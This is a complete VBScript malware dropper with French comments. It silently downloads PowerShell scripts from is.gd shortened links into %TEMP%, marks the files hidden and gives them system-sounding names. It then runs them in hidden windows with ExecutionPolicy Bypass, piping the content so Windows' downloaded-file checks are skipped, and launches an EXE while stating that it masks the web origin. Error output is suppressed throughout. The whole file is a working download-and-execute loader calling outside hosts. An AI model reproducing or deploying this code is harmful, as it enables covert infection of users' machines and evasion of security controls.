Option Explicit
On Error Resume Next ' Silence total en cas d'erreur

' --- 1. CONFIGURATION ---
Const URL_PS1_1 = "https://is.gd/8dXx7r" 
Const URL_PS1_2 = "https://is.gd/Q0RCKd"
Const URL_PS1_3 = ""
Const URL_EXE   = ""

' --- 2. INITIALISATION ---
Dim WshShell, FSO, UserDir, TempDir
Set WshShell = CreateObject("WScript.Shell")
Set FSO      = CreateObject("Scripting.FileSystemObject")

UserDir = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")
TempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")

' Chemins cibles
Dim P1, P2, P3, P_EXE
P1    = TempDir & "\win_sys_1.ps1"
P2    = TempDir & "\win_sys_2.ps1"
P3    = TempDir & "\win_sys_3.ps1"
P_EXE = UserDir & "\SystemHostService.exe"

' --- 3. LOGIQUE D'EXÉCUTION FORCÉE ---

' A. Téléchargement furtif
If URL_PS1_1 <> "" Then FastDownload URL_PS1_1, P1
If URL_PS1_2 <> "" Then FastDownload URL_PS1_2, P2
If URL_PS1_3 <> "" Then FastDownload URL_PS1_3, P3
If URL_EXE   <> "" Then FastDownload URL_EXE,   P_EXE

' B. Exécution des PS1 (Terminaux séparés, 7s d'intervalle, Mode Forcé)
' On utilise 'Get-Content | PowerShell' pour exécuter le code sans que Windows 
' ne vérifie l'origine du fichier (Bypass les restrictions de fichiers téléchargés).
If Valid(P1) Then
    WshShell.Run "cmd /c powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Get-Content '" & P1 & "' | powershell -""", 0, False
    WScript.Sleep 7000 
End If

If Valid(P2) Then
    WshShell.Run "cmd /c powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Get-Content '" & P2 & "' | powershell -""", 0, False
    WScript.Sleep 7000
End If

If Valid(P3) Then
    WshShell.Run "cmd /c powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Get-Content '" & P3 & "' | powershell -""", 0, False
    WScript.Sleep 7000
End If

' C. Lancement de l'EXE (Forçage via CMD pour éviter l'alerte de zone)
WScript.Sleep 10000
If Valid(P_EXE) Then
    ' Lancement via CMD /C pour masquer l'origine Web et forcer l'exécution invisible
    WshShell.Run "cmd /c start /b """" """ & P_EXE & """", 0, False
End If

' Nettoyage et sortie
Set WshShell = Nothing : Set FSO = Nothing
WScript.Quit

' --- 4. FONCTIONS CRITIQUES ---

Sub FastDownload(Url, TargetPath)
    On Error Resume Next
    ' Supprime l'ancien si présent
    If FSO.FileExists(TargetPath) Then 
        FSO.GetFile(TargetPath).Attributes = 0
        FSO.DeleteFile TargetPath, True
    End If
    
    ' Téléchargement via WebClient (Plus rapide et discret que Invoke-WebRequest)
    Dim psCmd
    psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
            "[Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192; " & _
            "(New-Object System.Net.WebClient).DownloadFile('" & Url & "', '" & TargetPath & "')"
    
    WshShell.Run psCmd, 0, True ' Attend que le téléchargement finisse
    
    ' Cache le fichier immédiatement
    If FSO.FileExists(TargetPath) Then FSO.GetFile(TargetPath).Attributes = 2
End Sub

Function Valid(fPath)
    Valid = False
    If FSO.FileExists(fPath) Then
        If FSO.GetFile(fPath).Size > 0 Then Valid = True
    End If
End Function


